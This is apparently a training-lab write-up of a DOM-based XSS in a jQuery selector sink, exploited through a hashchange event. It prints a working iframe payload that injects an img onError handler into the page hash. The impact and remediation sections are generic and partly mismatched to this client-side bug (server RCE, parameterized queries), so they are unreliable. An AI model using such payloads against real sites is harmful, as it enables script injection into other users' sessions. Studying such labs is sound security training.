# DOM XSS in jQuery selector sink using a hashchange event

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal:

Exploit the DOM-based XSS vulnerability to call the print() function

### Analysis/Exploit:

the `iframe`’s `src` attribute points to the vulnerable page with an empty hash value. When the `iframe` is loaded, an XSS payload is appended to the hash, causing the `hashchange` event to fire.

```javascript
<iframe src="https://0a63007904e71eb080612b3800ab000f.web-security-academy.net/#" onload="this.src+='<img src=x onError=print()>' "> </iframe>
```

![](./images/4b886ff1713c_001.png)

### Real-World Impact

An attacker could exploit this vulnerability to:
- Access sensitive data belonging to other users
- Bypass authentication or authorization controls
- Perform unauthorized actions on behalf of legitimate users
- Potentially achieve remote code execution on the server
- Compromise the integrity or availability of the application

### Remediation

- Implement proper server-side input validation for all user-controlled data
- Use parameterized queries and prepared statements
- Enforce server-side authorization checks on every request
- Follow the principle of least privilege
- Implement security headers (CSP, X-Frame-Options, X-Content-Type-Options)
- Use a Web Application Firewall (WAF) as defense-in-depth
